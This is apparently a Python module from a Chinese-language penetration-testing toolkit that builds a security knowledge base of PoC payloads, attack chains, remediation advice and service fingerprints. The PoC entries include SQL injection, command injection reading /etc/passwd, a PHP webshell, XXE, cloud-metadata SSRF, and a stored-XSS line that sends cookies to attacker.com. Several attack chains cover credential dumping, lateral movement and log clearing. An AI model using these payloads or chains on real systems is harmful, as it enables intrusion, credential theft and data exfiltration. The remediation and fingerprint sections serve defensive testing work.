#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
base知识库模块，存储和管理相关安全知识、漏洞信息和攻击链数据。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""
import json
import os
import re
from typing import Any, Dict, List, Optional
from dataclasses import dataclass, field

from utils.logger import log


@dataclass
class PoCEntry:
    """PoC条目"""
    poc_id: str
    vuln_name: str
    cve_id: str = ""
    severity: str = "medium"
    category: str = ""  # sql_injection/xss/command_injection/ssrf/...
    description: str = ""
    payload: str = ""
    affected_versions: str = ""
    references: List[str] = field(default_factory=list)
    verification_steps: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """执行相关操作。

        Returns:
            操作结果。
        """
        return {
            "poc_id": self.poc_id,
            "vuln_name": self.vuln_name,
            "cve_id": self.cve_id,
            "severity": self.severity,
            "category": self.category,
            "description": self.description,
            "payload": self.payload,
            "affected_versions": self.affected_versions,
            "references": self.references,
            "verification_steps": self.verification_steps
        }


@dataclass
class AttackChain:
    """攻击链"""
    chain_id: str
    name: str
    description: str
    stages: List[Dict[str, Any]] = field(default_factory=list)
    target_type: str = ""  # web_server/database/cms/iot/...
    difficulty: str = "medium"  # easy/medium/hard
    mitre_attack: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """执行相关操作。

        Returns:
            操作结果。
        """
        return {
            "chain_id": self.chain_id,
            "name": self.name,
            "description": self.description,
            "stages": self.stages,
            "target_type": self.target_type,
            "difficulty": self.difficulty,
            "mitre_attack": self.mitre_attack
        }


@dataclass
class RemediationEntry:
    """修复方案条目"""
    rem_id: str
    vuln_category: str
    vuln_name: str
    severity: str = "medium"
    description: str = ""
    remediation_steps: List[str] = field(default_factory=list)
    code_examples: Dict[str, str] = field(default_factory=dict)
    best_practices: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """执行相关操作。

        Returns:
            操作结果。
        """
        return {
            "rem_id": self.rem_id,
            "vuln_category": self.vuln_category,
            "vuln_name": self.vuln_name,
            "severity": self.severity,
            "description": self.description,
            "remediation_steps": self.remediation_steps,
            "code_examples": self.code_examples,
            "best_practices": self.best_practices,
            "references": self.references
        }


@dataclass
class FingerprintEntry:
    """指纹条目"""
    fp_id: str
    name: str
    category: str = ""  # cms/web_server/database/framework/device/...
    indicators: Dict[str, List[str]] = field(default_factory=dict)  # header/banner/title/favicon/path
    version_patterns: List[str] = field(default_factory=list)
    known_vulnerabilities: List[str] = field(default_factory=list)
    description: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """执行相关操作。

        Returns:
            操作结果。
        """
        return {
            "fp_id": self.fp_id,
            "name": self.name,
            "category": self.category,
            "indicators": self.indicators,
            "version_patterns": self.version_patterns,
            "known_vulnerabilities": self.known_vulnerabilities,
            "description": self.description
        }


class SecurityKnowledgeBase:
    """安全知识库"""

    def __init__(self, data_dir: str = "data/knowledge_base"):
        """初始化SecurityKnowledgeBase实例。

        Args:
            self: 类实例。
        """
        self.data_dir = data_dir
        self.poc_library: Dict[str, PoCEntry] = {}
        self.attack_chains: Dict[str, AttackChain] = {}
        self.remediation_library: Dict[str, RemediationEntry] = {}
        self.fingerprint_library: Dict[str, FingerprintEntry] = {}

        os.makedirs(data_dir, exist_ok=True)
        self._init_builtin_knowledge()

    def _init_builtin_knowledge(self):
        """初始化内置知识库"""
        self._init_poc_library()
        self._init_attack_chains()
        self._init_remediation_library()
        self._init_fingerprint_library()
        log.info(f"知识库初始化完成: PoC={len(self.poc_library)}, 攻击链={len(self.attack_chains)}, "
                 f"修复方案={len(self.remediation_library)}, 指纹={len(self.fingerprint_library)}")

    def _init_poc_library(self):
        """初始化PoC库"""
        pocs = [
            PoCEntry(
                poc_id="poc-001",
                vuln_name="SQL注入 - UNION查询",
                cve_id="",
                severity="critical",
                category="sql_injection",
                description="通过UNION SELECT提取数据库数据，适用于有回显的注入点",
                payload="1 UNION SELECT NULL,username,password FROM users--",
                affected_versions="所有存在SQL注入的应用",
                verification_steps=[
                    "1. 确认注入点存在（单引号报错）",
                    "2. 使用ORDER BY确定列数",
                    "3. 使用UNION SELECT确定回显位",
                    "4. 构造查询提取数据"
                ],
                references=["https://owasp.org/www-community/attacks/SQL_Injection"]
            ),
            PoCEntry(
                poc_id="poc-002",
                vuln_name="SQL注入 - 报错注入",
                severity="high",
                category="sql_injection",
                description="通过数据库报错函数提取数据，适用于有错误回显的场景",
                payload="1 AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--",
                affected_versions="MySQL 5.x及以上",
                verification_steps=[
                    "1. 确认注入点存在",
                    "2. 测试报错函数是否可用",
                    "3. 构造报错注入提取数据"
                ]
            ),
            PoCEntry(
                poc_id="poc-003",
                vuln_name="反射型XSS",
                severity="high",
                category="xss",
                description="用户输入未经过滤直接反射到页面，可执行任意JavaScript",
                payload="<script>alert(document.cookie)</script>",
                affected_versions="所有存在XSS的Web应用",
                verification_steps=[
                    "1. 在输入框输入测试payload",
                    "2. 检查payload是否未过滤输出",
                    "3. 测试Cookie窃取payload"
                ],
                references=["https://owasp.org/www-community/attacks/xss/"]
            ),
            PoCEntry(
                poc_id="poc-004",
                vuln_name="存储型XSS",
                severity="critical",
                category="xss",
                description="恶意脚本存储在数据库中，其他用户访问时执行",
                payload="<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
                affected_versions="留言板/评论/用户资料等存储用户输入的功能",
                verification_steps=[
                    "1. 在可存储输入的位置注入payload",
                    "2. 访问显示该内容的页面",
                    "3. 确认脚本执行"
                ]
            ),
            PoCEntry(
                poc_id="poc-005",
                vuln_name="命令注入",
                severity="critical",
                category="command_injection",
                description="用户输入直接拼接到系统命令中，可执行任意系统命令",
                payload="; cat /etc/passwd",
                affected_versions="所有存在命令注入的应用",
                verification_steps=[
                    "1. 确认参数拼接到系统命令",
                    "2. 测试分号/管道/&&等注入符",
                    "3. 执行id/whoami等命令确认"
                ]
            ),
            PoCEntry(
                poc_id="poc-006",
                vuln_name="目录遍历",
                severity="high",
                category="path_traversal",
                description="文件路径参数未过滤，可读取任意文件",
                payload="../../../../etc/passwd",
                affected_versions="文件下载/查看功能",
                verification_steps=[
                    "1. 确认参数用于文件路径",
                    "2. 测试../序列",
                    "3. 读取/etc/passwd或win.ini确认"
                ]
            ),
            PoCEntry(
                poc_id="poc-007",
                vuln_name="SSRF - 云元数据",
                severity="critical",
                category="ssrf",
                description="服务端请求伪造可访问云元数据服务，获取临时凭证",
                payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                affected_versions="AWS/Azure/GCP等云环境",
                verification_steps=[
                    "1. 确认存在URL请求功能",
                    "2. 测试访问127.0.0.1",
                    "3. 测试访问云元数据地址"
                ]
            ),
            PoCEntry(
                poc_id="poc-008",
                vuln_name="文件上传漏洞",
                severity="critical",
                category="file_upload",
                description="文件上传功能未验证文件类型，可上传webshell",
                payload="上传包含<?php system($_GET['cmd']); ?>的.php文件",
                affected_versions="所有文件上传功能",
                verification_steps=[
                    "1. 上传测试文件",
                    "2. 检查文件类型验证",
                    "3. 访问上传的文件确认执行"
                ]
            ),
            PoCEntry(
                poc_id="poc-009",
                vuln_name="IDOR越权访问",
                severity="high",
                category="idor",
                description="对象级授权缺失，可遍历ID访问其他用户数据",
                payload="修改URL中的id参数为其他用户ID",
                affected_versions="所有按ID查询对象的API",
                verification_steps=[
                    "1. 登录用户A获取数据",
                    "2. 修改ID为用户B的ID",
                    "3. 确认可访问用户B的数据"
                ]
            ),
            PoCEntry(
                poc_id="poc-010",
                vuln_name="XXE外部实体注入",
                severity="high",
                category="xxe",
                description="XML解析器加载外部实体，可读取文件或进行SSRF",
                payload="<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>&xxe;",
                affected_versions="所有解析XML的应用",
                verification_steps=[
                    "1. 确认存在XML解析功能",
                    "2. 构造DOCTYPE实体",
                    "3. 检查文件内容是否返回"
                ]
            ),
        ]
        for poc in pocs:
            self.poc_library[poc.poc_id] = poc

    def _init_attack_chains(self):
        """初始化攻击链库"""
        chains = [
            AttackChain(
                chain_id="chain-001",
                name="Web应用完整入侵链",
                description="从信息收集到获取服务器权限的完整攻击链",
                target_type="web_server",
                difficulty="medium",
                mitre_attack=["T1595", "T1190", "T1505", "T1059"],
                stages=[
                    {"stage": "信息收集", "tools": ["nmap", "dirsearch", "whatweb"], "goal": "发现开放端口、目录、技术栈"},
                    {"stage": "漏洞发现", "tools": ["sqlmap", "xss_scanner", "nikto"], "goal": "发现可利用漏洞"},
                    {"stage": "漏洞利用", "tools": ["sqlmap", "metasploit", "custom_poc"], "goal": "获取初始访问权限"},
                    {"stage": "权限提升", "tools": ["linpeas", "sudo_check", "kernel_exploit"], "goal": "提升到root/system权限"},
                    {"stage": "持久化", "tools": ["cron", "systemd", "webshell"], "goal": "建立持久化访问"},
                    {"stage": "横向移动", "tools": ["mimikatz", "crackmapexec", "ssh"], "goal": "访问内网其他系统"},
                    {"stage": "数据窃取", "tools": ["tar", "scp", "database_dump"], "goal": "窃取敏感数据"},
                    {"stage": "痕迹清理", "tools": ["log_cleaner", "history_clear"], "goal": "清除攻击痕迹"},
                ]
            ),
            AttackChain(
                chain_id="chain-002",
                name="SQL注入到服务器控制",
                description="从SQL注入漏洞到完全控制服务器的攻击链",
                target_type="web_application",
                difficulty="high",
                mitre_attack=["T1190", "T1505", "T1059"],
                stages=[
                    {"stage": "注入点发现", "tools": ["sqlmap", "手动测试"], "goal": "发现SQL注入点"},
                    {"stage": "数据库枚举", "tools": ["sqlmap --dbs"], "goal": "枚举数据库、表、列"},
                    {"stage": "数据提取", "tools": ["sqlmap --dump"], "goal": "提取用户凭据、敏感数据"},
                    {"stage": "文件写入", "tools": ["sqlmap --os-shell"], "goal": "通过INTO OUTFILE写入webshell"},
                    {"stage": "命令执行", "tools": ["webshell", "os-shell"], "goal": "执行系统命令"},
                    {"stage": "权限提升", "tools": ["内核漏洞", "sudo滥用"], "goal": "提升到root权限"},
                ]
            ),
            AttackChain(
                chain_id="chain-003",
                name="云服务器SSRF攻击链",
                description="利用SSRF漏洞攻击云服务器元数据服务获取权限",
                target_type="cloud_server",
                difficulty="medium",
                mitre_attack=["T1190", "T1552", "T1078"],
                stages=[
                    {"stage": "SSRF发现", "tools": ["burp", "手动测试"], "goal": "发现URL请求功能"},
                    {"stage": "内网探测", "tools": ["SSRF"], "goal": "扫描内网端口和服务"},
                    {"stage": "元数据访问", "tools": ["SSRF"], "goal": "访问169.254.169.254获取元数据"},
                    {"stage": "凭证获取", "tools": ["SSRF"], "goal": "获取IAM角色临时凭证"},
                    {"stage": "云API调用", "tools": ["awscli", "curl"], "goal": "使用凭证调用云API"},
                    {"stage": "数据访问", "tools": ["aws s3", "aws rds"], "goal": "访问S3存储桶、数据库"},
                ]
            ),
            AttackChain(
                chain_id="chain-004",
                name="内网横向移动攻击链",
                description="从一台内网主机到控制整个域的攻击链",
                target_type="internal_network",
                difficulty="high",
                mitre_attack=["T1003", "T1021", "T1078", "T1068"],
                stages=[
                    {"stage": "信息收集", "tools": ["ipconfig", "net view", "bloodhound"], "goal": "收集域信息、用户、计算机"},
                    {"stage": "凭证获取", "tools": ["mimikatz", "procdump", "lsassy"], "goal": "提取内存中的密码哈希"},
                    {"stage": "哈希传递", "tools": ["crackmapexec", "psexec", "wmiexec"], "goal": "使用Pass-the-Hash访问其他主机"},
                    {"stage": "权限提升", "tools": ["juicypotato", "printspoofer", "内核漏洞"], "goal": "提升到SYSTEM权限"},
                    {"stage": "域控攻击", "tools": ["mimikatz dcsync", "zerologon"], "goal": "攻击域控制器获取域管理员权限"},
                    {"stage": "黄金票据", "tools": ["mimikatz kerberos"], "goal": "创建黄金票据持久化访问域"},
                ]
            ),
        ]
        for chain in chains:
            self.attack_chains[chain.chain_id] = chain

    def _init_remediation_library(self):
        """初始化修复方案库"""
        remediations = [
            RemediationEntry(
                rem_id="rem-001",
                vuln_category="sql_injection",
                vuln_name="SQL注入",
                severity="critical",
                description="用户输入直接拼接到SQL查询中，导致攻击者可执行任意SQL命令",
                remediation_steps=[
                    "1. 使用参数化查询/预编译语句（Prepared Statements）",
                    "2. 使用ORM框架（如SQLAlchemy、Hibernate）",
                    "3. 对用户输入进行严格的白名单验证",
                    "4. 使用最小权限的数据库账户",
                    "5. 禁用数据库错误信息回显",
                    "6. 部署WAF进行防护"
                ],
                code_examples={
                    "Python (安全)": "cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))",
                    "Python (危险)": "cursor.execute(f'SELECT * FROM users WHERE id = {user_id}')",
                    "Java (安全)": "PreparedStatement pstmt = conn.prepareStatement('SELECT * FROM users WHERE id = ?'); pstmt.setInt(1, userId);",
                },
                best_practices=[
                    "永远不要信任用户输入",
                    "使用参数化查询而非字符串拼接",
                    "数据库账户遵循最小权限原则",
                    "定期进行SQL注入安全测试"
                ],
                references=["https://owasp.org/www-community/attacks/SQL_Injection"]
            ),
            RemediationEntry(
                rem_id="rem-002",
                vuln_category="xss",
                vuln_name="跨站脚本攻击(XSS)",
                severity="high",
                description="用户输入未经过滤直接输出到HTML页面，导致攻击者可执行恶意JavaScript",
                remediation_steps=[
                    "1. 对所有用户输入进行HTML实体编码",
                    "2. 使用Content Security Policy (CSP)",
                    "3. 设置HttpOnly和Secure Cookie标志",
                    "4. 使用框架自带的XSS防护（如React的自动转义）",
                    "5. 对富文本使用白名单过滤（如DOMPurify）",
                    "6. 部署WAF进行防护"
                ],
                code_examples={
                    "Python (安全)": "from markupsafe import escape; output = escape(user_input)",
                    "JavaScript (安全)": "element.textContent = userInput; // 而非innerHTML",
                    "HTML CSP": "<meta http-equiv='Content-Security-Policy' content='default-src 'self'>",
                },
                best_practices=[
                    "输出编码是防护XSS的第一道防线",
                    "CSP可以显著降低XSS危害",
                    "不要使用innerHTML插入用户输入",
                    "定期进行XSS安全测试"
                ]
            ),
            RemediationEntry(
                rem_id="rem-003",
                vuln_category="command_injection",
                vuln_name="命令注入",
                severity="critical",
                description="用户输入直接拼接到系统命令中，导致攻击者可执行任意系统命令",
                remediation_steps=[
                    "1. 避免直接调用系统命令，使用编程语言API代替",
                    "2. 如必须调用，使用参数化方式（如subprocess的列表参数）",
                    "3. 对用户输入进行严格的白名单验证",
                    "4. 使用escapeshellarg/escapeshellcmd转义",
                    "5. 以最低权限运行应用进程",
                    "6. 部署WAF进行防护"
                ],
                code_examples={
                    "Python (安全)": "subprocess.run(['ping', '-c', '1', host], check=True)",
                    "Python (危险)": "os.system(f'ping -c 1 {host}')",
                    "PHP (安全)": "exec('ping -c 1 ' . escapeshellarg($host));",
                },
                best_practices=[
                    "能不用系统命令就不用",
                    "使用列表参数而非字符串拼接",
                    "白名单验证是最可靠的防护",
                    "应用进程不要以root运行"
                ]
            ),
            RemediationEntry(
                rem_id="rem-004",
                vuln_category="ssrf",
                vuln_name="服务端请求伪造(SSRF)",
                severity="high",
                description="服务器端发起请求的URL可被用户控制，导致攻击者可访问内网服务和云元数据",
                remediation_steps=[
                    "1. 限制可请求的协议（仅允许http/https）",
                    "2. 使用白名单限制可访问的域名",
                    "3. 禁止访问内网IP段（10.x/172.16-31.x/192.168.x/127.x）",
                    "4. 禁止访问云元数据地址（169.254.169.254）",
                    "5. 禁用重定向跟随",
                    "6. 不返回目标服务器的响应内容"
                ],
                best_practices=[
                    "SSRF在云环境中危害极大",
                    "白名单比黑名单更可靠",
                    "云元数据地址必须被禁止",
                    "使用DNS重绑定防护"
                ]
            ),
            RemediationEntry(
                rem_id="rem-005",
                vuln_category="file_upload",
                vuln_name="文件上传漏洞",
                severity="critical",
                description="文件上传功能未验证文件类型和内容，攻击者可上传webshell获取服务器权限",
                remediation_steps=[
                    "1. 验证文件扩展名（白名单）",
                    "2. 验证文件MIME类型",
                    "3. 验证文件内容（文件头/魔数）",
                    "4. 重命名上传的文件（随机文件名）",
                    "5. 将上传文件存储在Web根目录之外",
                    "6. 上传目录禁止脚本执行",
                    "7. 设置文件大小限制"
                ],
                best_practices=[
                    "扩展名白名单比黑名单可靠",
                    "不要相信客户端的MIME类型",
                    "上传目录必须禁止执行脚本",
                    "随机文件名防止路径预测"
                ]
            ),
            RemediationEntry(
                rem_id="rem-006",
                vuln_category="idor",
                vuln_name="不安全的直接对象引用(IDOR)",
                severity="high",
                description="API未验证用户是否有权访问请求的对象，攻击者可遍历ID访问其他用户数据",
                remediation_steps=[
                    "1. 在服务端验证用户对对象的访问权限",
                    "2. 使用不可预测的对象标识符（UUID）",
                    "3. 实现对象级授权检查",
                    "4. 使用基于角色的访问控制(RBAC)",
                    "5. 记录对象访问日志进行审计"
                ],
                best_practices=[
                    "永远不要信任客户端传来的ID",
                    "服务端授权检查是必须的",
                    "UUID比自增ID更难遍历",
                    "定期进行越权测试"
                ]
            ),
        ]
        for rem in remediations:
            self.remediation_library[rem.rem_id] = rem

    def _init_fingerprint_library(self):
        """初始化指纹库"""
        fingerprints = [
            FingerprintEntry(
                fp_id="fp-001",
                name="WordPress",
                category="cms",
                indicators={
                    "header": ["X-Powered-By: PHP", "Link: <https://wordpress.org/"],
                    "path": ["/wp-content/", "/wp-includes/", "/wp-login.php", "/wp-admin/"],
                    "meta": ["<meta name=\"generator\" content=\"WordPress"],
                    "favicon": ["/favicon.ico (WordPress logo)"]
                },
                version_patterns=[r'WordPress (\d+\.\d+(\.\d+)?)', r'wp-includes/js/jquery/jquery\.js\?ver=([\d.]+)'],
                known_vulnerabilities=["CVE-2022-21661", "CVE-2021-44223", "CVE-2020-36326"],
                description="世界上最流行的CMS，占网站市场份额40%以上"
            ),
            FingerprintEntry(
                fp_id="fp-002",
                name="Apache HTTP Server",
                category="web_server",
                indicators={
                    "header": ["Server: Apache", "Server: Apache/"],
                    "banner": ["Apache/"]
                },
                version_patterns=[r'Apache/([\d.]+)'],
                known_vulnerabilities=["CVE-2021-41773", "CVE-2021-42013", "CVE-2017-15715"],
                description="最流行的Web服务器软件"
            ),
            FingerprintEntry(
                fp_id="fp-003",
                name="Nginx",
                category="web_server",
                indicators={
                    "header": ["Server: nginx", "Server: nginx/"],
                    "banner": ["nginx/"]
                },
                version_patterns=[r'nginx/([\d.]+)'],
                known_vulnerabilities=["CVE-2021-23017", "CVE-2019-20372"],
                description="高性能Web服务器和反向代理"
            ),
            FingerprintEntry(
                fp_id="fp-004",
                name="MySQL",
                category="database",
                indicators={
                    "banner": ["MySQL", "mariadb"],
                    "port": ["3306"],
                    "error": ["MySQL syntax", "mysql_fetch", "SQLSTATE"]
                },
                version_patterns=[r'MySQL ([\d.]+)', r'mariadb-([\d.]+)'],
                known_vulnerabilities=["CVE-2022-21473", "CVE-2021-23714"],
                description="最流行的开源关系型数据库"
            ),
            FingerprintEntry(
                fp_id="fp-005",
                name="PHP",
                category="programming_language",
                indicators={
                    "header": ["X-Powered-By: PHP", "X-Powered-By: PHP/"],
                    "path": [".php"],
                    "error": ["PHP Warning", "PHP Fatal error", "phpinfo()"]
                },
                version_patterns=[r'PHP/([\d.]+)'],
                known_vulnerabilities=["CVE-2022-31626", "CVE-2021-21703"],
                description="最流行的Web开发语言"
            ),
            FingerprintEntry(
                fp_id="fp-006",
                name="Drupal",
                category="cms",
                indicators={
                    "header": ["X-Generator: Drupal"],
                    "path": ["/sites/default/", "/modules/", "/themes/", "/user/login"],
                    "meta": ["<meta name=\"Generator\" content=\"Drupal"]
                },
                version_patterns=[r'Drupal ([\d.]+)'],
                known_vulnerabilities=["CVE-2018-7600 (Drupalgeddon2)", "CVE-2019-6340"],
                description="企业级开源CMS"
            ),
            FingerprintEntry(
                fp_id="fp-007",
                name="Joomla",
                category="cms",
                indicators={
                    "path": ["/administrator/", "/components/", "/modules/", "/templates/"],
                    "meta": ["<meta name=\"generator\" content=\"Joomla"]
                },
                version_patterns=[r'Joomla! ([\d.]+)'],
                known_vulnerabilities=["CVE-2023-23752", "CVE-2015-8562"],
                description="开源CMS系统"
            ),
            FingerprintEntry(
                fp_id="fp-008",
                name="Redis",
                category="database",
                indicators={
                    "port": ["6379"],
                    "banner": ["redis_version", "redis_mode"]
                },
                version_patterns=[r'redis_version:([\d.]+)'],
                known_vulnerabilities=["CVE-2022-0543", "CVE-2021-32675"],
                description="内存键值数据库，常因未授权访问被攻击"
            ),
            FingerprintEntry(
                fp_id="fp-009",
                name="Elasticsearch",
                category="database",
                indicators={
                    "port": ["9200", "9300"],
                    "header": ["application/json"],
                    "banner": ["\"name\"", "\"cluster_name\"", "\"version\""]
                },
                version_patterns=[r'"number" : "([\d.]+)"'],
                known_vulnerabilities=["CVE-2014-3120", "CVE-2015-1427"],
                description="搜索引擎，常因未授权访问泄露数据"
            ),
            FingerprintEntry(
                fp_id="fp-010",
                name="Docker API",
                category="devops",
                indicators={
                    "port": ["2375", "2376"],
                    "path": ["/version", "/containers/json", "/images/json"]
                },
                version_patterns=[r'"Version": "([\d.]+)"'],
                known_vulnerabilities=["未授权访问可控制Docker守护进程"],
                description="Docker远程API，未授权暴露可导致服务器被完全控制"
            ),
        ]
        for fp in fingerprints:
            self.fingerprint_library[fp.fp_id] = fp

    # ===== 查询方法 =====
    def search_poc(self, keyword: str = "", category: str = "", severity: str = "") -> List[Dict[str, Any]]:
        """搜索PoC"""
        results = []
        for poc in self.poc_library.values():
            if keyword and keyword.lower() not in poc.vuln_name.lower() and keyword.lower() not in poc.description.lower():
                continue
            if category and poc.category != category:
                continue
            if severity and poc.severity != severity:
                continue
            results.append(poc.to_dict())
        return results

    def search_attack_chains(self, keyword: str = "", target_type: str = "") -> List[Dict[str, Any]]:
        """搜索攻击链"""
        results = []
        for chain in self.attack_chains.values():
            if keyword and keyword.lower() not in chain.name.lower() and keyword.lower() not in chain.description.lower():
                continue
            if target_type and chain.target_type != target_type:
                continue
            results.append(chain.to_dict())
        return results

    def search_remediation(self, keyword: str = "", category: str = "") -> List[Dict[str, Any]]:
        """搜索修复方案"""
        results = []
        for rem in self.remediation_library.values():
            if keyword and keyword.lower() not in rem.vuln_name.lower() and keyword.lower() not in rem.description.lower():
                continue
            if category and rem.vuln_category != category:
                continue
            results.append(rem.to_dict())
        return results

    def identify_fingerprint(self, headers: Dict[str, str] = None, body: str = "",
                              url: str = "", port: int = None) -> List[Dict[str, Any]]:
        """识别指纹"""
        matches = []
        headers_lower = {k.lower(): v.lower() for k, v in (headers or {}).items()}
        body_lower = body.lower()

        for fp in self.fingerprint_library.values():
            score = 0
            indicators = fp.indicators

            # Header匹配
            for header_pattern in indicators.get("header", []):
                header_name = header_pattern.split(":")[0].lower()
                if header_name in headers_lower:
                    if header_pattern.split(":")[1].strip().lower() in headers_lower[header_name]:
                        score += 3

            # 路径匹配
            for path_pattern in indicators.get("path", []):
                if path_pattern in url or path_pattern in body_lower:
                    score += 2

            # 端口匹配
            if port and str(port) in indicators.get("port", []):
                score += 2

            # Banner匹配
            for banner_pattern in indicators.get("banner", []):
                if banner_pattern.lower() in body_lower or banner_pattern.lower() in str(headers).lower():
                    score += 3

            if score >= 3:
                fp_dict = fp.to_dict()
                fp_dict["match_score"] = score
                matches.append(fp_dict)

        matches.sort(key=lambda x: x["match_score"], reverse=True)
        return matches

    def get_statistics(self) -> Dict[str, Any]:
        """获取知识库统计"""
        return {
            "poc_count": len(self.poc_library),
            "attack_chains_count": len(self.attack_chains),
            "remediation_count": len(self.remediation_library),
            "fingerprint_count": len(self.fingerprint_library),
            "poc_by_severity": {
                sev: sum(1 for p in self.poc_library.values() if p.severity == sev)
                for sev in ["critical", "high", "medium", "low"]
            },
            "poc_by_category": {
                cat: sum(1 for p in self.poc_library.values() if p.category == cat)
                for cat in set(p.category for p in self.poc_library.values())
            },
            "fingerprint_by_category": {
                cat: sum(1 for f in self.fingerprint_library.values() if f.category == cat)
                for cat in set(f.category for f in self.fingerprint_library.values())
            }
        }


# 全局实例
knowledge_base = SecurityKnowledgeBase()
